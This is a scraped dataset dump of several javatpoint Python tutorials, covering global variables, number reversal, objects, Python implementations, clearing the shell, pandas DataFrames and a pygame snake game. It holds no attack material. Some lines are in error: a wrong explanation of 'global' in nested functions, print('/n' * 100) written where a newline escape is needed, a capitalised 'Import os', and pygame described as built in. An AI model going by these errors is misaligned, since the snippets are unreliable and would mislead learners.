we have modified the value of a, b, and msg. These global variables were defined in the name.py file and we imported name, and accessed these variables.\nCode - 3: Make a result.py file to print the modified global variables.\n\r\nimport name \r\nimport change\r\nprint(change.a) \r\nprint(change.b)  \r\nprint(change.msg)\r\n\nOutput:\n15\r\n26\r\nWelcome to JavaTpoint\r\n\nGlobal in Nested Functions\nWe can use the global keyword inside a nested function. We must declare the variable using the global keyword inside a nested function. Let\'s understand the following example.\nExample -\n\r\n# The example of global in nested function\r\n\r\ndef add():\r\n    a = 15\r\n\r\n    def modify():\r\n        global a\r\n        a = 20\r\n\r\n    print(""Before modifying : "", a)\r\n    print(""Making change"")\r\n    modify()\r\n    print(""After modifying: "", a)\r\n\r\n\r\nadd()\r\nprint(""value of x: "", a)\r\n\nOutput:\nBefore modifying :  15\r\nMaking change\r\nAfter modifying:  15\r\nvalue of x 20\r\n\nExplanation:\nIn the above code, the value inside add() takes the value of local variable x = 15. In modify() function, we have assigned the x = 20 using the global keyword. That change reflected in add() function variable.\n\n\nNext TopicHow to reverse a number in Python\n\n\n\n← prev\nnext →\n\n\n']","['Example - Local Variables', 'Explanation:', 'Example -', 'Explanation:', 'Example - 3:', 'Explanation:', 'Example - Without global keyword', 'Explanation:', 'Example - With global Keyword', 'Explanation:', 'Global Variables in Python Modules', 'Global in Nested Functions']",[],"[""Let's understand the following example of a local and global variable."", ""To overcome this problem, we use global variables. Let's understand the example of a global variable."", 'If we define the same name local variable, it will print the value that is inside the function and then global variable value.', 'We have defined the local variable the same name as a global variable; first, it printed the local variable and then global variable value.', 'Rules of global Keywords', 'Code - 1: Make a name.py file to store the global variables.', 'Code - 2: Make a change.py file to modify global variables.', 'Code - 3: Make a result.py file to print the modified global variables.', 'Explanation:']","['On the other hand, a variable defined in a block and available for in that block is called a local variable. Such a variable can be accessed only in the defined block.', 'The variable is defined inside the function and it can only use in a defined function so that nature of the variable is called a local variable. We cannot access them in other functions.', 'In the above code, we have defined two global variables a and b outside the functions. We used them inside the sum() and sub() function. Both functions returned the result when we called.', 'The above code has thrown an error because we have tried to assign the value to the global variable. We can modify the value of global value inside a function using the global keyword.', 'Here, we have modified the value of a, b, and msg. These global variables were defined in the name.py file and we imported name, and accessed these variables.', ""We can use the global keyword inside a nested function. We must declare the variable using the global keyword inside a nested function. Let's understand the following example."", 'In the above code, the value inside add() takes the value of local variable x = 15. In modify() function, we have assigned the x = 20 using the global keyword. That change reflected in add() function variable.']","['Python provides the global Keyword that is used to modify the value of the global variable inside the function. It is beneficial when we want to change the value of the global variable or assign some other value. Below are a few rules to define the global variables.', 'In the above example, we have defined the variable c in mul() function using the global keyword. The value of c is multiplied by the 10; therefore, it returned the 200. We can see in the output that the variation in value inside the function is reflected in the value outside the global variable.', ""The benefit of the global keyword is to create global variables and share them among the different modules. For example - we create a name.py which consists of global variables. If we change these variables, then this change will reflect everywhere. Let's understand the following example.""]","['# example of local variable', 'def sum():', 'a = 10   # local variables', 'b = 20', 'c = a + b', 'print(""the sum is:"", c)', 'sum()  # function calling', '# example of a global variable', 'a = 20   # defined outside the function', 'def sum():', 'c = a + b  # Using global variables', 'print(""The sum is:"", c)', 'def sub():', 'd = a - b   # using global variables', 'print(""The sub is:"", d)', 'sum()  # function calling', 'def msg():', 'm = ""Hello, how are you?""', 'print(m)', 'm = ""I am fine""  # global scope', 'print(m)', '# The example of without using the global keyword', 'def mul():', '# Multiply by 10', 'c = c * 10', 'print(c)', '# The example using the global keyword', 'def mul():', 'global c', '# Multiply by 10', 'c = c * 10', 'print(""The value inside function: "", c)', ""print('The value outside the function: ', c)"", 'msg = ""Hello World""', 'import name', 'name.a = 15', 'name.b = 26', 'name.msg = ""Welcome to JavaTpoint""', 'import name', 'import change', 'print(change.a)', 'print(change.b)', 'print(change.msg)', '# The example of global in nested function', 'def add():', 'a = 15', 'def modify():', 'global a', 'a = 20', 'print(""Before modifying : "", a)', 'print(""Making change"")', 'modify()', 'print(""After modifying: "", a)', 'print(""value of x: "", a)']","['The sum is: 30', 'The sum is: 30', 'The sub is: 10', 'Hello, how are you?', 'I am fine', 'line 8, in mul', 'c = c * 10', ""UnboundLocalError: local variable 'c' referenced before assignment"", 'The value inside function:  100', 'The value outside the function:  100', '15', '26', 'Welcome to JavaTpoint', 'Before modifying :  15', 'Making change', 'After modifying:  15', 'value of x 20']",[],"[""|||If the value is defined output the function, it will automatically become the global variable or its scope globally.|||The global Keyword is used to declare the global variable inside a function.|||We don't need to use the global keyword to declare a global variable outside the function.|||Variables that have reference inside a function are implicitly global.|||""]"
108,['How to reverse a number in Python'],['It is the most asked programming question in the interview. We can reverse the integer number in Python using the different methods.'],"['https://www.javatpoint.com/what-is-an-object-in-python', 'https://www.javatpoint.com/how-to-declare-a-global-variable-in-python', 'https://www.javatpoint.com/https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/what-is-an-object-in-python', 'https://www.javatpoint.com/how-to-declare-a-global-variable-in-python', 'https://www.javatpoint.com/what-is-an-object-in-python']",['https://static.javatpoint.com/python/images/how-to-reverse-a-number-in-python.png'],[],[],"['Reverse a number using Python while loop', 'Algorithm', 'Program', 'Reverse a Number Using Recursion']",[],"[""Let's implement the above algorithm in program."", 'Explanation -', ""Let's understand this program step by step."", 'We initialed a number variable for user input and variable revs_number initial value to null.', 'First Iteration', 'Second Iteration', 'Now the number is 123, and the revs_number is 5. The while checks its condition and executes for the next iteration.', 'Third Iteration', 'From the Second Iteration, the values of both Number and Reverse have been changed as: number = 123 and revs_number = 54', 'Fourth Iteration', 'The modified number is 12 and the revs_number is 543: Now while executes again.', 'Fifth Iteration', 'while loop is terminated because if found the false as a Boolean result.', 'You can enter the different number and check the result.', ""Let's understand the following example."", 'Logic is same in both programs. Once you understand the logic, it will easy to do it by own.']","[""Here we will write the program which takes input number and reversed the same. Let's understand the following methods of reversing the integer number."", 'First, we understand the algorithm of this program. It will make easy to understand the program logic. Once you get the logic, you can write the program in any language, not only Python.']",[],"['Input Integer:  number', '(1) Initialize variable revs_number = 0', '(2) Loop while number > 0', '(a) Multiply revs_number by 10 and add remainder of number', 'divide by 10 to revs_number', 'revs_number = revs_number*10 + number%10;', '(b) Divide num by 10', '(3) Return revs_number', '# Ask for enter the number from the use', 'number = int(input(""Enter the integer number: ""))', '# Initiate value to null', 'revs_number = 0', '# reverse the integer number using the while loop', 'while (number > 0):', '# Logic', 'remainder = number % 10', 'revs_number = (revs_number * 10) + remainder', 'number = number // 10', '# Display the result', 'print(""The reverse number is : {}"".format(revs_number))', 'num = int(input(""Enter the number: ""))', 'revr_num = 0    # initial value is 0. It will hold the reversed number', 'def recur_reverse(num):', 'global revr_num   # We can use it out of the function', 'if (num > 0):', 'Reminder = num % 10', 'revr_num = (revr_num * 10) + Reminder', 'recur_reverse(num // 10)', 'return revr_num', 'revr_num = recur_reverse(num)', 'print(""n Reverse of entered number is = %d"" % revr_num)']","['Enter the integer number: 12345', 'The reverse number is: 54321', 'Enter the number: 5426', 'The Reverse of entered number is = 6245']",[],['|||Using while loop|||Using recursion|||']
109,['What is an object in Python'],"['Python is an object-oriented programming language. Everything is in Python treated as an object, including variable, function, list, tuple, dictionary, set, etc. Every object belongs to its class. For example - An integer variable belongs to integer class. An object is a real-life entity. An object is the collection of various data and functions that operate on those data. An object contains the following properties.']","['https://www.javatpoint.com/which-is-the-fastest-implementation-of-python', 'https://www.javatpoint.com/how-to-reverse-a-number-in-python', 'https://www.javatpoint.com/which-is-the-fastest-implementation-of-python', 'https://www.javatpoint.com/how-to-reverse-a-number-in-python', 'https://www.javatpoint.com/which-is-the-fastest-implementation-of-python']",[],[],[],"['Syntax:', 'Creating an Object of class']",[],"[""Let's understand the object in the aspect of classes."", 'The syntax of creating a class is given below. The syntax of creating a class is given below.', 'The class keyword is used to define the class and the user-define class name replaces ClassName.', 'In the following example, we have created the object of Person class.', 'Explanation:']","['The class contains the user-defined data structure that holds the own data members such as variables, constructs, and member functions, which can be accessed by creating an object of the class.', 'The object is essential to work with the class attributes. Instantiate is a term used when we create the object of any class, and the instance is also referred to as an object. The object is created using the class name. The syntax is given below.', 'In the above code, we have created a Person class which consisted of two attributes age, name and display function. We created the object of person class called per . Using the object along with the .dot operator, we accessed the class function.']","[""The classes and objects are the essential key to the object-oriented programming. Classes are the blueprint of the object. Classes are used to bundling the data and functionality together. Each newly created class must have its object. Let's understand real-life example of class and object."", ""A human is a class which may have may attributes such as walking, sleeping, thinking, etc. Suppose we want to name and age of 100 humans, so we don't need to create a class for every person. We just need to instantiate the multiple objects of that perticular class.""]","['class ClassName:', '#statement_suite', '<object-name> = <class-name>(<arguments>)', 'class Person:', 'name = ""John""', 'age = 24', 'def display (self):', 'print(""Age: %d \\nName: %s""%(self.age,self.name))', '# Creating a emp instance of Employee class', 'per = Person()', 'per.display()']","['Age: 24', 'Name: John']",[],['|||State - The attributes of an object represents its state. It also reflects the properties of an object.|||Behavior - The method of an object represents its behavior.|||Identity - Each object must be uniquely identified and allow interacting with the other objects.|||']
110,['Which is the fastest implementation of Python'],"[""The newer Python version is faster than the previous version. Python 3.8 comes with the lot of modification that enhances it performances. We can't understand the performance of Python is that there is often a compromise between versatile, dynamic language, versus performance. We can't have everything at the same time. To test the performance of Python, programmer should apply the alternative implementations. Python is an interpreted language, at the same time it also provide the facility to compile the source code into the byte code that runs on a virtual machine. We can use the different compiler for different purpose to give us a performance edge.""]","['https://www.javatpoint.com/#', 'https://www.javatpoint.com/what-is-an-object-in-python', 'https://www.javatpoint.com/https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/https://www.javatpoint.com/c-programming-language-tutorial', 'https://www.javatpoint.com/https://www.javatpoint.com/java-tutorial', 'https://www.javatpoint.com/https://www.javatpoint.com/net-framework', 'https://www.javatpoint.com/https://www.javatpoint.com/asp-net-tutorial', 'https://www.javatpoint.com/https://www.javatpoint.com/cpp-tutorial', 'https://www.javatpoint.com/#', 'https://www.javatpoint.com/what-is-an-object-in-python', 'https://www.javatpoint.com/#']",[],[],[],"['PyPy', 'CPython', 'JPython or JPython', 'IronPython', 'Nuitka']",[],"['In this tutorial, we will see the different implementation of Python.', 'Programmers have dispute about which one is the fastest - PyPy and CPython, but the general consensus is that is PyPy is faster.']",['This is all about of the different implementation of the Python. You can find the CPython faster than the other compilers but it is also dependent on the different use cases.'],"['PyPy is one of the most popular alternative compilers which used by the Python developer to gain more speed. PyPy works on the JIT (Just-In Time) compiler that compiles the part of code that enhances the performance. It also manage the memory efficiently using the GC improvements. It supports the stackless mode that can work with the micro-thread for concurrency.', 'The CPython is the most commonly used compiler of Python that written in C. It is a default compiler. The CPython converts the source code into the intermediate byte code and runs it by using the CPython Virtual Machine. CPython also works with the stackless mode that provides the micro-thread for concurrency.', 'We can assume that JPython is Java implementation of the Python. It allows the unified Python script can use onto the Java Platform. Java Programmers will use it bind the Python script into the large Java Applications. We can also use the Java threads to write multiple-threaded programs. It provides some speed but slower than the CPython. Python can be provided the extra efficiency in large scale Java application development.', ""The IronPython is the implementation of Python which is used to work with the .Net. We can use the .Net libraries through the Python scripts. It doesn't support the GIL; that means the performance of the multi-thread code is much better that other code. It provides the facility that we can work on the web server using the Python framework instead of ASP.NET."", 'Nuitka is a newly created compiler and not enough as the other compilers but it compiles the Python code in to C/C++ executable. It can work with the every version of Python from 2.6 to 3.8 and is twice faster than the CPython. We can use the Nuitka to develop the stand-alone executable for Python code even on Windows.']",[],[],[],[]
111,['How to clear Python shell'],"['Sometimes working with the Python shell, we got haphazard output or wrote unnecessary statements, and we want to clear the screen for some other reason.']","['https://www.javatpoint.com/how-to-create-a-dataframes-in-python', 'https://www.javatpoint.com/which-is-the-fastest-implementation-of-python', 'https://www.javatpoint.com/https://www.javatpoint.com/linux-tutorial', 'https://www.javatpoint.com/https://www.javatpoint.com/windows', 'https://www.javatpoint.com/https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/how-to-create-a-dataframes-in-python', 'https://www.javatpoint.com/which-is-the-fastest-implementation-of-python', 'https://www.javatpoint.com/how-to-create-a-dataframes-in-python']",[],[],[],[],['Note - An underscore variable is used because Python shell always stores its last output in the underscore.'],"['For example -', 'Though you could put this in a function:', 'And then call it when needed as cls() function. It will clear the console; all previous command will be vanished and screen start from the beginning.', 'If you are using a Linux, then -', ""If you're using Windows-"", 'We can also do it using the Python script. Consider the following example.']",[],"['The ""cls"" and ""clear"" commands are used to clear a terminal (terminal window). If, you are using the shell within IDLE, which won\'t be affected by such things. Unfortunately, there is no way to clear the screen in IDLE. The best you could do is to scroll the screen down lots of lines.']","['print(""/n"" * 100)', 'def cls():', 'print(""/n"" * 100)', 'Import os', ""os.system('clear')"", 'Import os', ""os.system('CLS')"", '# import os module', 'from os import system, name', '# sleep module to display output for some time period', 'from time import sleep', '# define the clear function', 'def clear():', '# for windows', ""if name == 'nt':"", ""_ = system('cls')"", ""# for mac and linux(here, os.name is 'posix')"", 'else:', ""_ = system('clear')"", '# print out some text', ""print('Hello\\n'*10)"", '# sleep time 2 seconds after printing output', 'sleep(5)', '# now call function we defined above', 'clear()']",[],[],[]
112,['How to create a DataFrames in Python'],"['A Data Frame is a two-dimension collection of data. It is a data structure where data is stored in tabular form. Datasets are arranged in rows and columns; we can store multiple datasets in the data frame. We can perform various arithmetic operations, such as adding column/row selection and columns/rows in the data frame.']","['https://www.javatpoint.com/how-to-develop-a-game-in-python', 'https://www.javatpoint.com/how-to-clear-python-shell', 'https://www.javatpoint.com/https://www.javatpoint.com/sql-tutorial', 'https://www.javatpoint.com/https://www.javatpoint.com/python-pandas', 'https://www.javatpoint.com/https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/how-to-develop-a-game-in-python', 'https://www.javatpoint.com/how-to-clear-python-shell', 'https://www.javatpoint.com/how-to-develop-a-game-in-python']",[],[],[],"['An empty dataframe', 'Method - 2: Create a dataframe using List', 'Method - 3: Create Dataframe from dict of ndarray/lists', 'Method - 4: Create a indexes Dataframe using arrays', 'Method - 5: Create Dataframe from list of dicts', 'Method - 6: Create Dataframe using the zip() function', 'Method - 7: Create Dataframe from Dicts of series']",[],"[""In this tutorial, we will learn to create the data frame in multiple ways. Let's understand these different ways."", 'First, we need to install the pandas library into the Python environment.', ""We can create a basic empty Dataframe. The dataframe constructor needs to be called to create the DataFrame. Let's understand the following example."", ""We can create dataframe using a single list or list of lists. Let's understand the following example."", ""Let's understand the following example to create the indexes dataframe using arrays."", 'Explanation -', 'In the above code, we have defined the column name with the various car names and their ratings. We used the array to create indexes.', ""Let's understand another example to create the pandas dataframe from list of dictionaries with both row index as well as column index."", 'Example - 2:', ""Let's understand another example to create dataframe by passing lists of dictionary and rows."", 'Example - 3', 'We have discussed the three ways to create the dataframe using the lists of dictionary.', ""The zip() function is used to merge the two lists. Let's understand the following example."", 'Example - ', 'In this tutorial, we have discussed the different ways to create the DataFrames. ']","['We can import the DataFrames from the external storage; these storages can be referred to as the SQL Database, CSV file, and an Excel file. We can also use the lists, dictionary, and from a list of dictionary, etc.', ""The dict of ndarray/lists can be used to create a dataframe, all the ndarray must be of the same length. The index will be a range(n) by default; where n denotes the array length. Let's understand the following example."", ""We can pass the lists of dictionaries as input data to create the Pandas dataframe. The column names are taken as keys by default. Let's understand the following example."", ""The dictionary can be passed to create a dataframe. We can use the Dicts of series where the subsequent index is the union of all the series of passed index value. Let's understand the following example.""]",[],"['# import pandas as pd', 'import pandas as pd', '# Calling DataFrame constructor', 'df = pd.DataFrame()', 'print(df)', '# importing pandas library', 'import pandas as pd', '# string values in the list', ""lst = ['Java', 'Python', 'C', 'C++',"", ""'JavaScript', 'Swift', 'Go']"", '# Calling DataFrame constructor on list', 'dframe = pd.DataFrame(lst)', 'print(dframe)', 'import pandas as pd', '# assign data of lists.', ""data = {'Name': ['Tom', 'Joseph', 'Krish', 'John'], 'Age': [20, 21, 19, 18]}"", '# Create DataFrame', 'df = pd.DataFrame(data)', '# Print the output.', 'print(df)', '# DataFrame using arrays.', 'import pandas as pd', '# assign data of lists.', ""data = {'Name':['Renault', 'Duster', 'Maruti', 'Honda City'], 'Ratings':[9.0, 8.0, 5.0, 3.0]}"", '# Creates pandas DataFrame.', ""df = pd.DataFrame(data, index =['position1', 'position2', 'position3', 'position4'])"", '# print the data', 'print(df)', '# the example is to create', '# Pandas DataFrame by lists of dicts.', 'import pandas as pd', '# assign values to lists.', ""data = [{'A': 10, 'B': 20, 'C':30}, {'x':100, 'y': 200, 'z': 300}]"", '# Creates DataFrame.', 'df = pd.DataFrame(data)', '# Print the data', 'print(df)', 'import pandas as pd', '# assigns values to lists.', ""data = [{'x': 1, 'y': 2}, {'A': 15, 'B': 17, 'C': 19}]"", '# With two column indices, values same', '# as dictionary keys', ""dframe1 = pd.DataFrame(data, index =['first', 'second'], columns =['x', 'y'])"", '# With two column indices with', '# one index with other name', ""dframe2 = pd.DataFrame(data, index =['first', 'second'], columns =['x', 'y1'])"", '# print the first data frame', 'print (dframe1, ""\\n"")', '# Print the second DataFrame.', 'print (dframe2)', '# The example is to create', '# Pandas DataFrame by passing lists of', '# Dictionaries and row indices.', 'import pandas as pd', '# assign values to lists', ""data = [{'x': 2, 'z':3}, {'x': 10, 'y': 20, 'z': 30}]"", '# Creates padas DataFrame by passing', '# Lists of dictionaries and row index.', ""dframe = pd.DataFrame(data, index =['first', 'second'])"", '# Print the dataframe', 'print(dframe)', '# The example is to create', '# pandas dataframe from lists using zip.', 'import pandas as pd', '# List1', ""Name = ['tom', 'krish', 'arun', 'juli']"", '# List2', 'Marks = [95, 63, 54, 47]', '#  two lists.', '# and merge them by using zip().', 'list_tuples = list(zip(Name, Marks))', '# Assign data to tuples.', 'print(list_tuples)', '# Converting lists of tuples into', '# pandas Dataframe.', ""dframe = pd.DataFrame(list_tuples, columns=['Name', 'Marks'])"", '# Print data.', 'print(dframe)', '# Pandas Dataframe from Dicts of series.', 'import pandas as pd', '# Initialize data to Dicts of series.', ""d = {'Electronics' : pd.Series([97, 56, 87, 45], index =['John', 'Abhinay', 'Peter', 'Andrew']),"", ""'Civil' : pd.Series([97, 88, 44, 96], index =['John', 'Abhinay', 'Peter', 'Andrew'])}"", '# creates Dataframe.', 'dframe = pd.DataFrame(d)', '# print the data.', 'print(dframe)']","['Empty DataFrame', 'Columns: []', 'Index: []', '0        Java', '1      Python', '2           C', '3         C++', '4   JavaScript', '5       Swift', '6          Go', 'Name  Age', '0     Tom   20', '1  Joseph   21', '2   Krish   19', '3    John   18', 'Name      Ratings', 'position1     Renault      9.0', 'position2      Duster      8.0', 'position3      Maruti      5.0', 'position4    Honda City      3.0', 'A      B      C      x      y      z', '0  10.0  20.0  30.0    NaN    NaN    NaN', '1   NaN   NaN   NaN  100.0  200.0  300.0', 'x    y', 'first   1.0   2.0', 'second  NaN NaN', 'x    y1', 'first   1.0 NaN', 'second NaN NaN', 'x     y   z', 'first    2   NaN   3', 'second  10  20.0  30', ""[('john', 95), ('krish', 63), ('arun', 54), ('juli', 47)]"", 'Name  Marks', '0   john     95', '1  krish     63', '2   arun     54', '3   juli     47', 'Electronics      Civil', 'John             97        97', 'Abhinay      56        88', 'Peter           87        44', 'Andrew      45        96']",[],[]
113,['How to develop a game in Python'],"['Python is the most versatile language, and it makes its presence almost in every field including Web-development, Machine Learning, Artificial Intelligence, GUI Application as well as Game Development.']","['https://www.javatpoint.com/how-to-install-tkinter-in-python', 'https://www.javatpoint.com/how-to-create-a-dataframes-in-python', 'https://www.javatpoint.com/https://www.javatpoint.com/machine-learning', 'https://www.javatpoint.com/https://www.javatpoint.com/artificial-intelligence-tutorial', 'https://www.javatpoint.com/https://www.javatpoint.com/pygame', 'https://www.javatpoint.com/https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/https://www.javatpoint.com/pygame', 'https://www.javatpoint.com/https://www.javatpoint.com/pygame', 'https://www.javatpoint.com/how-to-install-tkinter-in-python', 'https://www.javatpoint.com/how-to-create-a-dataframes-in-python', 'https://www.javatpoint.com/how-to-install-tkinter-in-python']","['https://static.javatpoint.com/python/images/how-to-develop-a-game-in-python.png', 'https://static.javatpoint.com/python/images/how-to-develop-a-game-in-python2.png', 'https://static.javatpoint.com/python/images/how-to-develop-a-game-in-python3.png', 'https://static.javatpoint.com/python/images/how-to-develop-a-game-in-python4.png', 'https://static.javatpoint.com/python/images/how-to-develop-a-game-in-python5.png']",[],[],"['Prerequisites for Pygame', 'Installing Pygame', 'Simple Pygame Example', 'Example - Developing Snake Game Using Pygame']",[],"['It is developed by Pete Shinners to replace PySDL.', 'To learn the pygame, we must have an understanding of Python programming language.', 'Open command-line terminal and type the following command to install pygame.', 'Here is the following example of creating a simple pygame window.', 'All graphics will draw in the pygame window.', ""Let's understand the basic syntax of the above program."", 'import pygame - It is the module which allows us to work with all function of pygame.', 'pygame.init() - It is used to initialize all the required modules of the pygame.', 'pygame.QUIT - It is used to dismiss the event when we click on the cross button at the corner of the window.', 'pygame.display.flip() - It is used to reflect any update to the game. If we make any change then we need to call the display.flip() function.', ""Let's understand the following example of shape drawing to the screen."", 'Explanation -', 'If the snake touches itself then it will terminate the game and display the following message.', 'We can play again by clicking on the OK button. We can see our score in Pycharm terminal (We have used Pycharm IDE; you can use any Python IDE).', 'Copy the above code and paste it into your IDE and have fun. To understand the concepts of Pygame, visit our full pygame tutorial.']","['Python provides a built-in library called pygame, which used to develop the game. Once we understand the basic concepts of Python programming, we can use the pygame library to make games with attractive graphics, suitable animation, and sound.', 'Pygame is a cross-platform library that is used to design video games. It includes computer graphics and sound libraries to give the standard game experience to the user.', 'We can also install it through IDE. For further installation guide, visit our complete pygame tutorial (https://www.javatpoint.com/pygame). Here you will find all the essential pygame explanations.', 'pygame.display.set_mode((width, height)) - It is used to resized the window size. It will return the surface object. The surface object is used to perform graphical operations.', 'pygame.event.get() - It makes the event queue empty. If we do not call it, the window messages will start to pile up and, the game will become unresponsive in the opinion of the operating system.', 'We can draw any shape to the pygame surface includes adding images, attractive font. Pygame provides many built-in functions to draw the geometrical shape to the screen. These shapes are initial stage of developing a game.', 'In the above example, we have drawn different shapes such as triangle, straight-line, rectangle, ellipse, circle, arc, filled circle, and oval. We have used the pygame.draw function according to the shape with suitable arguments.']",[],"['pip install pygame', 'import pygame', 'pygame.init()', 'screen = pygame.display.set_mode((400,500))', 'done = False', 'while not done:', 'for event in pygame.event.get():', 'if event.type == pygame.QUIT:', 'done = True', 'pygame.display.flip()', 'import pygame', 'from math import pi', 'pygame.init()', '# size variable is using for set screen size', 'size = [400, 300]', 'screen = pygame.display.set_mode(size)', 'pygame.display.set_caption(""Example program to draw geometry"")', '# done variable is using as flag', 'done = False', 'clock = pygame.time.Clock()', 'while not done:', '# clock.tick() limits the while loop to a max of 10 times per second.', 'clock.tick(10)', 'for event in pygame.event.get():  # User did something', 'if event.type == pygame.QUIT:  # If user clicked on close symbol', 'done = True  # done variable that we are complete, so we exit this loop', '# All drawing code occurs after the for loop and but', '# inside the main while done==False loop.', '# Clear the default screen background and set the white screen background', 'screen.fill((0, 0, 0))', '# Draw on the screen a green line which is 5 pixels wide.', 'pygame.draw.line(screen, (0, 255, 0), [0, 0], [50, 30], 5)', '# Draw on the screen a green line which is 5 pixels wide.', 'pygame.draw.lines(screen, (0, 0, 0), False, [[0, 80], [50, 90], [200, 80], [220, 30]], 5)', '# Draw a rectangle outline', 'pygame.draw.rect(screen, (0, 0, 0), [75, 10, 50, 20], 2)', '# Draw a solid rectangle', 'pygame.draw.rect(screen, (0, 0, 0), [150, 10, 50, 20])', '# This draw an ellipse outline, using a rectangle as the outside boundaries', 'pygame.draw.ellipse(screen, (255, 0, 0), [225, 10, 50, 20], 2)', '# This draw a solid ellipse, using a rectangle as the outside boundaries', 'pygame.draw.ellipse(screen, (255, 0, 0), [300, 10, 50, 20])', '# Draw a triangle using the polygon function', 'pygame.draw.polygon(screen, (0, 0, 0), [[100, 100], [0, 200], [200, 200]], 5)', '# This draw a circle', 'pygame.draw.circle(screen, (0, 0, 255), [60, 250], 40)', '# This draw an arc', 'pygame.draw.arc(screen, (0, 0, 0), [210, 75, 150, 125], 0, pi / 2, 2)', '# This function must write after all the other drawing commands.', 'pygame.display.flip()', '# Quite the execution when clicking on close', 'pygame.quit()', '# Snake Tutorial Using Pygame', 'import math', 'import random', 'import pygame', 'import tkinter as tk', 'from tkinter import messagebox', 'class cube(object):', 'rows = 20', 'w = 500', 'def __init__(self, start, dirnx=1, dirny=0, color=(255, 0, 0)):', 'self.pos = start', 'self.dirnx = 1', 'self.dirny = 0', 'self.color = color', 'def move(self, dirnx, dirny):', 'self.dirnx = dirnx', 'self.dirny = dirny', 'self.pos = (self.pos[0] + self.dirnx, self.pos[1] + self.dirny)', 'def draw(self, surface, eyes=False):', 'dis = self.w // self.rows', 'i = self.pos[0]', 'j = self.pos[1]', 'pygame.draw.rect(surface, self.color, (i * dis + 1, j * dis + 1, dis - 2, dis - 2))', 'if eyes:', 'centre = dis // 2', 'radius = 3', 'circleMiddle = (i * dis + centre - radius, j * dis + 8)', 'circleMiddle2 = (i * dis + dis - radius * 2, j * dis + 8)', 'pygame.draw.circle(surface, (0, 0, 0), circleMiddle, radius)', 'pygame.draw.circle(surface, (0, 0, 0), circleMiddle2, radius)', '# This class is defined for snake design and its movement', 'class snake(object):', 'body = []', 'turns = {}', 'def __init__(self, color, pos):', 'self.color = color', 'self.head = cube(pos)', 'self.body.append(self.head)', 'self.dirnx = 0', 'self.dirny = 1', 'def move(self):', 'for event in pygame.event.get():', 'if event.type == pygame.QUIT:', 'pygame.quit()', 'keys = pygame.key.get_pressed()', '# It will manage the keys movement for the snake', 'for key in keys:', 'if keys[pygame.K_LEFT]:', 'self.dirnx = -1', 'self.dirny = 0', 'self.turns[self.head.pos[:]] = [self.dirnx, self.dirny]', 'elif keys[pygame.K_RIGHT]:', 'self.dirnx = 1', 'self.dirny = 0', 'self.turns[self.head.pos[:]] = [self.dirnx, self.dirny]', 'elif keys[pygame.K_UP]:', 'self.dirnx = 0', 'self.dirny = -1', 'self.turns[self.head.pos[:]] = [self.dirnx, self.dirny]', 'elif keys[pygame.K_DOWN]:', 'self.dirnx = 0', 'self.dirny = 1', 'self.turns[self.head.pos[:]] = [self.dirnx, self.dirny]', '# Snake when hit the boundary wall', 'for i, c in enumerate(self.body):', 'p = c.pos[:]', 'if p in self.turns:', 'turn = self.turns[p]', 'c.move(turn[0], turn[1])', 'if i == len(self.body) - 1:', 'self.turns.pop(p)', 'else:', 'if c.dirnx == -1 and c.pos[0] <= 0:', 'c.pos = (c.rows - 1, c.pos[1])', 'elif c.dirnx == 1 and c.pos[0] >= c.rows - 1:', 'c.pos = (0, c.pos[1])', 'elif c.dirny == 1 and c.pos[1] >= c.rows - 1:', 'c.pos = (c.pos[0], 0)', 'elif c.dirny == -1 and c.pos[1] <= 0:', 'c.pos = (c.pos[0], c.rows - 1)', 'else:', 'c.move(c.dirnx, c.dirny)', 'def reset(self, pos):', 'self.head = cube(pos)', 'self.body = []', 'self.body.append(self.head)', 'self.turns = {}', 'self.dirnx = 0', 'self.dirny = 1', '# It will add the new cube in snake tail after every successful score', 'def addCube(self):', 'tail = self.body[-1]', 'dx, dy = tail.dirnx, tail.dirny', 'if dx == 1 and dy == 0:', 'self.body.append(cube((tail.pos[0] - 1, tail.pos[1])))', 'elif dx == -1 and dy == 0:', 'self.body.append(cube((tail.pos[0] + 1, tail.pos[1])))', 'elif dx == 0 and dy == 1:', 'self.body.append(cube((tail.pos[0], tail.pos[1] - 1)))', 'elif dx == 0 and dy == -1:', 'self.body.append(cube((tail.pos[0], tail.pos[1] + 1)))', 'self.body[-1].dirnx = dx', 'self.body[-1].dirny = dy', 'def draw(self, surface):', 'for i, c in enumerate(self.body):', 'if i == 0:', 'c.draw(surface, True)', 'else:', 'c.draw(surface)', 'def drawGrid(w, rows, surface):', 'sizeBtwn = w // rows', 'x = 0', 'y = 0', 'for l in range(rows):', 'x = x + sizeBtwn', 'y = y + sizeBtwn', '# draw grid line', 'pygame.draw.line(surface, (255, 255, 255), (x, 0), (x, w))', 'pygame.draw.line(surface, (255, 255, 255), (0, y), (w, y))', '# This class define for draw game surface', 'def redrawWindow(surface):', 'global rows, width, s, snack', '# This is used to grid surface', 'surface.fill((0, 0, 0))', 's.draw(surface)', 'snack.draw(surface)', 'drawGrid(width, rows, surface)', 'pygame.display.update()', 'def randomSnack(rows, item):', 'positions = item.body', 'while True:', 'x = random.randrange(rows)', 'y = random.randrange(rows)', 'if len(list(filter(lambda z: z.pos == (x, y), positions))) > 0:', 'continue', 'else:', 'break', 'return (x, y)', '# Using Tkinter function to display message', 'def message_box(subject, content):', 'root = tk.Tk()', 'root.attributes(""-topmost"", True)', 'root.withdraw()', 'messagebox.showinfo(subject, content)', 'try:', 'root.destroy()', 'except:', 'pass', '# main() function', 'def main():', 'global width, rows, s, snack', 'width = 500', 'rows = 20', 'win = pygame.display.set_mode((width, width))', 's = snake((255, 0, 0), (10, 10))', 'snack = cube(randomSnack(rows, s), color=(0, 255, 0))', 'flag = True', 'clock = pygame.time.Clock()', 'while flag:', 'pygame.time.delay(50)', 'clock.tick(10)', 's.move()', 'if s.body[0].pos == snack.pos:', 's.addCube()', 'snack = cube(randomSnack(rows, s), color=(0, 255, 0))', 'for x in range(len(s.body)):', 'if s.body[x].pos in list(map(lambda z: z.pos, s.body[x + 1:])):', ""print('Score: \\n', len(s.body))"", ""message_box('You Lost!\\n', 'Play again...\\n')"", 's.reset((10, 10))', 'break', 'redrawWindow(win)', 'pass']",[],[],[]
